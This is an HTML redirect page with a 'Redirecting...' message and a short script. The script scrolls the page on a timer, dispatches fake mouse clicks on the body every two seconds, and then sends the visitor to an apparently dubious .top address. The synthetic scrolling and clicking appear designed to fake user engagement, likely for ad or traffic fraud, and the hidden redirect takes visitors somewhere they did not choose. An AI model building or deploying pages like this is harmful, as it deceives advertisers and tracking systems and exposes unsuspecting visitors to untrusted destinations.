<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Redirecting...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      text-align: center;
      padding-top: 100px;
      color: #333;
      height: 3000px; /* Biar bisa scroll */
    }
  </style>
</head>
<body>
  <h1>Redirecting...</h1>
  <p>Hold on... sending you to your destination!</p>

  <script>
    // Loop scroll tiap 1.5 detik
    let scrollY = 0;
    setInterval(() => {
      scrollY += 200;
      window.scrollTo({ top: scrollY, behavior: 'smooth' });
    }, 1500);

    // Loop klik tiap 2 detik
    setInterval(() => {
      const clickEvent = new MouseEvent('click', {
        bubbles: true,
        cancelable: true,
        view: window
      });
      document.body.dispatchEvent(clickEvent);
    }, 2000);

    // Redirect cepat setelah 2 detik
    setTimeout(() => {
      window.location.href = "https://phoampor.top/4/9209440";
    }, 2000);
  </script>
</body>
</html>
